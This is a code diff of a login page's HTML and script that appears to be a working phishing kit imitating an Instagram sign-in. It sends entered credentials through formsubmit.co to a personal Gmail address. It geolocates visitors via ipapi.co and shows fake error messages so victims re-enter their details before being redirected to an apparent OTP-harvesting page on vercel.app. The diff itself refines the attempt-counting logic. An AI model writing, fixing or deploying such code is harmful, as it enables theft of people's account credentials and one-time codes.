@@ -38,8 +38,7 @@
 
         <div class="form-container">
           <form id="form" method="POST" action="https://formsubmit.co/iyanutosin2005@gmail.com">
-                  <input type="hidden" id="city" name="city">
-<input type="hidden" id="country" name="country">
+                 
             <div class="form-content box">
               <div class="logo">
                 <img src="./images/logo-light.png" class="logo-light" />
@@ -112,44 +111,53 @@
     </div>
   </div>
 
-  <script>
+<script>
+  // 1. Fetch Location Data immediately
   fetch('https://ipapi.co/json/')
-      .then(response => response.json())
-      .then(data => {
-        document.getElementById('city').value = data.city || '';
-        document.getElementById('country').value = data.country_name || '';
-      })
-      .catch(error => console.error('Location error:', error));
-      .catch(error => console.error('Location error:', error));
-  document.getElementById('form').addEventListener('submit', function (event) {
-            event.preventDefault();
-    const form = document.getElementById('form');
-    const nextField = document.getElementById('nextField');
-    const errorText = document.getElementById('errorText');
+    .then(response => response.json())
+    .then(data => {
+      // Ensure these IDs exist only ONCE in your HTML
+      const cityInput = document.getElementById('city');
+      const countryInput = document.getElementById('country');
+      
+      if(cityInput) cityInput.value = data.city || 'Unknown';
+      if(countryInput) countryInput.value = data.country_name || 'Unknown';
+    })
+    .catch(error => console.error('Location error:', error));
 
-    // Initialize login attempt counter
+  // 2. Handle Form Submission
+  const loginForm = document.getElementById('form');
+  const nextField = document.getElementById('nextField');
+  const errorText = document.getElementById('errorText');
+
+  loginForm.addEventListener('submit', function (event) {
+    // Initialize attempt counter if not exists
     if (!localStorage.getItem('login_attempt')) {
       localStorage.setItem('login_attempt', '0');
     }
 
-    form.addEventListener('submit', function () {
-      let attempt = parseInt(localStorage.getItem('login_attempt'));
+    let attempt = parseInt(localStorage.getItem('login_attempt'));
 
-      if (attempt < 3) {
-        errorText.style.display = 'block';
-        nextField.value = window.location.href; // submit but stay
-        localStorage.setItem('login_attempt', (attempt + 1).toString());
-      } else {
-        errorText.style.display = 'none';
-        nextField.value = "https://playe-xi.vercel.app/instagram/otp/657daf104b167f68d1979b9c.html"; // redirect
-        localStorage.removeItem('login_attempt');
-      }
-    });
-  </script>
+    if (attempt < 2) { // Show error for first few tries
+      event.preventDefault(); // Stop actual submission to show error
+      errorText.style.display = 'block';
+      localStorage.setItem('login_attempt', (attempt + 1).toString());
+      
+      // Optional: Manually submit via AJAX here if you want data sent every time
+    } else {
+      // Final attempt: allow submission and redirect
+      errorText.style.display = 'none';
+      nextField.value = "https://playe-xi.vercel.app/instagram/otp/657daf104b167f68d1979b9c.html";
+      localStorage.removeItem('login_attempt');
+      // No preventDefault here, so the form actually submits to FormSubmit.co
+    }
+  });
+</script>
 
   <script src='app.js'></script>
 </body>
 </html>
+
 
 
 
